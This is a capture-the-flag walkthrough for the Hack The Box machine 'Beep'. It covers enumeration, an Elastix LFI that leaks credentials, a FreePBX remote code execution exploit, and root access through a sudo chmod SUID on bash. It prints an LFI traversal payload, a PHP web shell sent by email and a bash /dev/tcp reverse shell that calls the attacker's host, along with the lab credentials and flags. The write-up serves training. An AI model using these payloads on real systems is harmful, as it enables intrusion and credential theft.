---
description: 10.10.10.7
---

# Beep

![](<../../.gitbook/assets/1 (5).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

Method 1 (LFI to RCE via FreePBX CVE; sudo ro root - detailed walkthrough below):

* User - Elastix 2.2.0 - 'graph.php' Local File Inclusion (EDB-ID: 37637), allows us to view the settings of components of the Asterisk Management Portal, including usernames and passwords. Login to the Elastix portal to find alot of info including an active phone ext number. Another way to get the extension is to use "sipvicious" ([https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)), for example (). Using the ext number, we're able to take advantage of CVE: 2012-4869 to get RCE and a shell as "asterisk".
* Root - User "asterisk" can run sudo on multiple commands including chmod, chown, nmap etc.

Method 2 (LFI to SSH as root):

* User - Elastix 2.2.0 - 'graph.php' Local File Inclusion (EDB-ID: 37637), allows us to view the settings of components of the Asterisk Management Portal, including usernames and passwords.
* Root - SSH as "root" using password found in config via LFI.

Method 3 (LFI to RCE via SMTP; sudo ro root):

* User - Elastix 2.2.0 - 'graph.php' Local File Inclusion (EDB-ID: 37637), allows us to view the current user via the file /proc/self/environ, which confirms it is "asterisk". Connect to SMTP port, verify "asterisk" has a mailbox, and send an email from anyone to "asterisk", with some PHP code in the data section (eg \<?php system($\_GET\["CMD"]); ?> ). Then use the LFI to view the mail at /var/mail/asterisk, and append the command to the LFI (eg \&CMD=bash -i >& /dev/tcp/10.10.14.7/9999 0>&1) to get a shell as "asterisk".
* Root - User "asterisk" can run sudo on multiple commands including chmod, chown, nmap etc.



## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.7 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 06:16 EST
Nmap scan report for 10.10.10.7
Host is up (0.050s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
879/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 22.39 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -sC -A -p 22,25,80,110,111,143,443,879,993,995,3306,4190,4445,5038,10000 10.10.10.7 -n
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 06:19 EST
Nmap scan report for 10.10.10.7
Host is up (0.014s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_pop3-capabilities: LOGIN-DELAY(0) APOP RESP-CODES AUTH-RESP-CODE STLS IMPLEMENTATION(Cyrus POP3 server v2) USER UIDL PIPELINING TOP EXPIRE(NEVER)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            876/udp   status
|_  100024  1            879/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_imap-capabilities: CONDSTORE IMAP4rev1 CATENATE THREAD=ORDEREDSUBJECT IDLE STARTTLS IMAP4 RIGHTS=kxte NAMESPACE X-NETSCAPE LIST-SUBSCRIBED LISTEXT URLAUTHA0001 Completed SORT=MODSEQ SORT THREAD=REFERENCES LITERAL+ OK ID NO ANNOTATEMORE QUOTA MULTIAPPEND BINARY CHILDREN UIDPLUS UNSELECT RENAME ATOMIC ACL MAILBOX-REFERRALS
|_sslv2: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2021-11-27T12:27:47+00:00; +1h05m01s from scanner time.
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
879/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
3306/tcp  open  mysql      MySQL (unauthorized)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|media device|PBX|WAP|specialized|printer|storage-misc
Running (JUST GUESSING): Linux 2.6.X|2.4.X (95%), Linksys embedded (94%), Riverbed RiOS (94%), HP embedded (94%), Netgear embedded (94%), Osmosys embedded (93%), Thecus embedded (93%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:linux:linux_kernel:2.6.27 cpe:/o:linux:linux_kernel:2.4.32 cpe:/h:linksys:wrv54g cpe:/o:riverbed:rios cpe:/h:netgear:eva9100 cpe:/h:thecus:4200 cpe:/h:thecus:n5500
Aggressive OS guesses: Linux 2.6.18 (95%), Linux 2.6.27 (95%), Linux 2.6.9 - 2.6.24 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.27 (likely embedded) (95%), Linux 2.6.20-1 (Fedora Core 5) (95%), Linux 2.6.30 (95%), Linux 2.6.5 - 2.6.12 (95%), Linux 2.6.5-7.283-smp (SuSE Enterprise Server 9, x86) (95%), Linux 2.6.8 (Debian 3.1) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 1h05m00s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   12.36 ms 10.10.14.1
2   13.19 ms 10.10.10.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 310.99 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb https://10.10.10.7/
https://10.10.10.7/ [200 OK] Apache[2.2.3], Cookies[elastixSession], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.2.3 (CentOS)], IP[10.10.10.7], PHP[5.1.6], PasswordField[input_pass], Script[text/javascript], Title[Elastix - Login page], X-Powered-By[PHP/5.1.6]  

```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host https://10.10.10.7/ -C all                                                                    1 ⨯
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.7
+ Target Hostname:    10.10.10.7
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
                   Ciphers:  DHE-RSA-AES256-SHA
                   Issuer:   /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
+ Start Time:         2021-11-27 08:13:24 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.3 (CentOS)
+ Cookie elastixSession created without the secure flag
+ Cookie elastixSession created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.1.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 889199, size: 28, mtime: Fri Jan  8 00:43:28 2072
+ Apache/2.2.3 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.0.1".
+ Hostname '10.10.10.7' does not match certificate's names: localhost.localdomain
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /help/: Help directory should not be accessible
+ Cookie PHPSESSID created without the secure flag
+ Cookie PHPSESSID created without the httponly flag
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /static/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /panel/: Admin login page/section found.
+ 26621 requests: 0 error(s) and 28 item(s) reported on remote host
+ End Time:           2021-11-27 09:01:08 (GMT-5) (2864 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.7/ -q -f -t 100 -x php,sh,bak,txt -k
/cgi-bin/ (Status: 403)
/images/ (Status: 200)
/index.php (Status: 200)
/icons/ (Status: 200)
/register.php (Status: 200)
/help/ (Status: 200)
/themes/ (Status: 200)
/modules/ (Status: 200)
/mail/ (Status: 200)
/admin/ (Status: 302)
/static/ (Status: 200)
/mailman/ (Status: 403)
/pipermail/ (Status: 200)
/lang/ (Status: 200)
/config.php (Status: 200)
/robots.txt (Status: 200)
/error/ (Status: 403)
/var/ (Status: 200)
/panel/ (Status: 200)
/libs/ (Status: 200)
/recordings/ (Status: 200)
/configs/ (Status: 200)

```

## Website exploration

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* Port 80 redirects to port 443; we get login prompt for "Elastix", no domain names in certificate, nothing useful in page source
* Port 10000 has "Webmin" instance running, nothing revealing in page source

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing useful in scripts loaded on port 443 or port 10000

### ​Browsing

Visiting the main page on port 443, we see a login form for "Elastix".

![](<../../.gitbook/assets/2 (6).JPG>)

A google search for "elastix default login" finds the following page, however, none of these worked:

{% embed url="https://dariusfreamon.wordpress.com/2013/11/01/elastix-pbx-default-credentials" %}

We also find comments on this page ([https://www.elastix.org/community/threads/default-passwords-not-password.8416/](https://www.elastix.org/community/threads/default-passwords-not-password.8416/)) that refer to a document ([http://asterisk-service.com/downloads/elastix\_without\_tears.pdf](http://asterisk-service.com/downloads/elastix\_without\_tears.pdf)) which contains the following table:

![](<../../.gitbook/assets/5 (2).JPG>)

Unfortunately, we don't know which version this is yet and so this makes guessing the default creds a bit harder.

Let's check the exploit database. We'll do a search that excludes any "Cross-site" scripting results as we are not really interested in those for now:

```
└─$ searchsploit elastix | grep -v 'Cross-Site'
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                               | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                              | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                          | php/webapps/18650.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                   
```

There are a few interesting results here, however, since we don't know the version yet we would need to try them all. We'll come back to this later.

Next, we open the page at [https://10.10.10.7/admin/](https://10.10.10.7/admin/), which is one of the routes found by gobuster. We also get a login prompt, this time from "FreePBX".

![](<../../.gitbook/assets/3 (3).JPG>)

Unfortunately password guessing on this prompt also fails. If we click "Cancel", we are taken to the following page, which reveals the target is running "FreePBX v 2.8.1.4".

![](<../../.gitbook/assets/4 (5).JPG>)

Clicking on the "Recordings" tab, takes us to yet another login prompt, this time the version shown is "FreePBX 2.5".

![](<../../.gitbook/assets/6 (2).JPG>)

We try the default creds from the table above but none of them work here either.

Let's check the exploit database for "FreePBX".

```
└─$ searchsploit freepbx   
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
FreePBX - 'config.php' Remote Code Execution (Metasploit)                       | unix/remote/32512.rb
FreePBX 13 - Remote Command Execution / Privilege Escalation                    | php/webapps/40614.py
FreePBX 13.0.35 - Remote Command Execution                                      | php/webapps/40296.txt
FreePBX 13.0.35 - SQL Injection                                                 | php/webapps/40312.txt
FreePBX 13.0.x < 13.0.154 - Remote Command Execution                            | php/webapps/40345.txt
FreePBX 13/14 - Remote Command Execution / Privilege Escalation                 | linux/remote/40232.py
FreePBX 2.1.3 - 'upgrade.php' Remote File Inclusion                             | php/webapps/2665.txt
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                          | php/webapps/18650.py
FreePBX 2.11.0 - Remote Command Execution                                       | php/webapps/32214.pl
FreePBX 2.2 - SIP Packet Multiple HTML Injection Vulnerabilities                | multiple/remote/29873.php
FreePBX 2.5.1 - SQL Injection                                                   | multiple/webapps/11186.txt
FreePBX 2.5.2 - '/admin/config.php?tech' Cross-Site Scripting                   | php/webapps/33442.txt
FreePBX 2.5.2 - Zap Channel Addition Description Parameter Cross-Site Scripting | php/webapps/33443.txt
FreePBX 2.5.x - Information Disclosure                                          | multiple/webapps/11187.txt
FreePBX 2.5.x < 2.6.0 - Persistent Cross-Site Scripting                         | multiple/webapps/11184.txt
FreePBX 2.8.0 - Recordings Interface Allows Remote Code Execution               | php/webapps/15098.txt
FreePBX 2.9.0/2.10.0 - 'callmenum' Remote Code Execution (Metasploit)           | php/webapps/18659.rb
FreePBX 2.9.0/2.10.0 - Multiple Vulnerabilities                                 | php/webapps/18649.txt
FreePBX < 13.0.188 - Remote Command Execution (Metasploit)                      | php/remote/40434.rb
Freepbx < 2.11.1.5 - Remote Code Execution                                      | php/webapps/41005.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

There are quite a few results here. We'll come back to this later.

Next, we browse to the page at [https://10.10.10.7:10000/](https://10.10.10.7:10000), where we get yet another login form, this time for "Webmin".

![](<../../.gitbook/assets/7 (3).JPG>)

A search for default creds reveals that by default "Webmin" uses the root account, and so the login attempts with basic default creds don't work here.

We have uncovered quite alot on the target at this stage, and we have not yet even looked at the non web based ports that are open.&#x20;

Before we move on to those, lets check the exploit database results first.

## Elastix

### EDB-ID: 37637

Looking at the output from searchsploit, let's check out the first entry:

{% embed url="https://www.exploit-db.com/exploits/37637" %}

This exploit contains a perl script, with the following commented line:

> \#LFI Exploit: /vtigercrm/graph.php?current\_language=../../../../../../../..//etc/amportal.conf%00\&module=Accounts\&action

Let's use this in the browser to see if it works:

> [https://10.10.10.7/vtigercrm/graph.php?current\_language=../../../../../../../..//etc/amportal.conf%00\&module=Accounts\&action](https://10.10.10.7/vtigercrm/graph.php?current\_language=../../../../../../../..//etc/amportal.conf%00\&module=Accounts\&action)

It works, we get back the "amportal.conf" file, and if we view page source, we see a nicely formatted version of the file, which contains a bunch of creds:

![](<../../.gitbook/assets/8 (3).JPG>)

![](<../../.gitbook/assets/9 (3).JPG>)

```
# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

Using the creds "asteriskuser:jEhdIekWmdjE", we are able to login to the "Elastix" webapp, where we are presented with a dashboard.

![](<../../.gitbook/assets/10 (1).JPG>)

We are also able to see the version information not only for "Elastix", but also for "FreePBX" and "Asterisk".

![](<../../.gitbook/assets/11 (2).JPG>)

## FreePBX

A quick search for "searchsploit freepbx 2.8", narrows down the results from our earlier search when we didn't know the version.

```
└─$ searchsploit freepbx | grep -v 13                                                                         2 ⚙
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
FreePBX - 'config.php' Remote Code Execution (Metasploit)                       | unix/remote/32512.rb
FreePBX 2.1.3 - 'upgrade.php' Remote File Inclusion                             | php/webapps/2665.txt
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                          | php/webapps/18650.py
FreePBX 2.11.0 - Remote Command Execution                                       | php/webapps/32214.pl
FreePBX 2.2 - SIP Packet Multiple HTML Injection Vulnerabilities                | multiple/remote/29873.php
FreePBX 2.5.1 - SQL Injection                                                   | multiple/webapps/11186.txt
FreePBX 2.5.2 - '/admin/config.php?tech' Cross-Site Scripting                   | php/webapps/33442.txt
FreePBX 2.5.2 - Zap Channel Addition Description Parameter Cross-Site Scripting | php/webapps/33443.txt
FreePBX 2.5.x - Information Disclosure                                          | multiple/webapps/11187.txt
FreePBX 2.5.x < 2.6.0 - Persistent Cross-Site Scripting                         | multiple/webapps/11184.txt
FreePBX 2.8.0 - Recordings Interface Allows Remote Code Execution               | php/webapps/15098.txt
FreePBX 2.9.0/2.10.0 - 'callmenum' Remote Code Execution (Metasploit)           | php/webapps/18659.rb
FreePBX 2.9.0/2.10.0 - Multiple Vulnerabilities                                 | php/webapps/18649.txt
Freepbx < 2.11.1.5 - Remote Code Execution                                      | php/webapps/41005.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                           

```

### CVE: 2010-3490

Let's have a look at the entry "Recordings Interface Allows Remote Code Execution" (15098):

{% embed url="https://www.exploit-db.com/exploits/15098" %}

After reading the exploit, and browsing the webapp for a short while, we found the location to upload files (recordings) by navigating to PBX --> Tools --> Recordings. The "browse" button is greyed out, and so we need to associate the amin account with an extension. A popup window appears, where we need to enter the admin password and select an extension from the drop down list as shown below. Apply the changes, and back in the "Recordings" window the "Browse" button is now enabled.

![](<../../.gitbook/assets/13 (2).JPG>)

Let's try and upload an unmodified PHP reverse shell ( we used one from Kali under /usr/share/webshells/php), but unfortunately we get an error.

![](<../../.gitbook/assets/14 (2).JPG>)

![](<../../.gitbook/assets/15 (1).JPG>)

After trying a few times, we could not get this to work, and so we decided to move on to the next exploit.

## Gaining Access

### CVE: 2012-4869

The next one we will try is the following

{% embed url="https://www.exploit-db.com/exploits/18650" %}
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
{% endembed %}

This is a python script, which requires some minimal modifications for the IP addresses and for the extension number to target as follows:

> rhost="10.10.10.7"&#x20;
>
> lhost="10.10.14.6"&#x20;
>
> lport=9999&#x20;
>
> extension="233"

Start a netcat listener and run the exploit:

```
└─$ python 18650.py
                             
```

```
└─$ nc -nvlp 9999      
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.7.
Ncat: Connection from 10.10.10.7:45270.
id
uid=100(asterisk) gid=101(asterisk)

```

Let's upgrade the shell and grab the user flag.

```
which python
/usr/bin/python
which python3
python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.2$ id
id
uid=100(asterisk) gid=101(asterisk)
bash-3.2$ pwd
pwd
/tmp
bash-3.2$ cd /home
cd /home
bash-3.2$ ls -la
ls -la
total 28
drwxr-xr-x  4 root       root       4096 Apr  7  2017 .
drwxr-xr-x 22 root       root       4096 Nov 27 14:19 ..
drwxrwxr-x  2 fanis      fanis      4096 Apr  7  2017 fanis
drwx------  2 spamfilter spamfilter 4096 Apr  7  2017 spamfilter
bash-3.2$ cd fanis
cd fanis
bash-3.2$ ls -la
ls -la
total 32
drwxrwxr-x 2 fanis fanis 4096 Apr  7  2017 .
drwxr-xr-x 4 root  root  4096 Apr  7  2017 ..
-rw------- 1 fanis fanis  114 Apr  7  2017 .bash_history
-rw-r--r-- 1 fanis fanis   33 Apr  7  2017 .bash_logout
-rw-r--r-- 1 fanis fanis  176 Apr  7  2017 .bash_profile
-rw-r--r-- 1 fanis fanis  124 Apr  7  2017 .bashrc
-rw-rw-r-- 1 fanis fanis   33 Nov 27 14:19 user.txt
bash-3.2$ cat user.txt
cat user.txt
d55c9b05cf173dd6ed4128a6e62510ea
bash-3.2$ 

```

## Enumeration as "asterisk"

Let's see if asterisk can run any commands as root:

```
bash-3.2$ sudo -l
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
bash-3.2$ 

```

## Privilege Escalation

Based on the output of "sudo -l", there are many options to escalate to root.

We chose to simply set the SUID bit on the /bin/bash binary. Once that was done, we simply run it, and we can grab the root flag.

```
bash-3.2$ which bash
which bash
/bin/bash
bash-3.2$ ls -la /bin/bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
bash-3.2$ sudo /bin/chmod u+s /bin/bash
sudo /bin/chmod u+s /bin/bash
bash-3.2$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
bash-3.2$ /bin/bash -p
/bin/bash -p
bash-3.2# id
id
uid=100(asterisk) gid=101(asterisk) euid=0(root)
bash-3.2# cd /root
cd /root
bash-3.2# ls
ls
anaconda-ks.cfg            install.log.syslog  webmin-1.570-1.noarch.rpm
elastix-pr-2.2-1.i386.rpm  postnochroot
install.log                root.txt
bash-3.2# cat root.txt
cat root.txt
3d8751c2a8b394c7b8c6a29c72f891e9
bash-3.2# 
```

## Resources

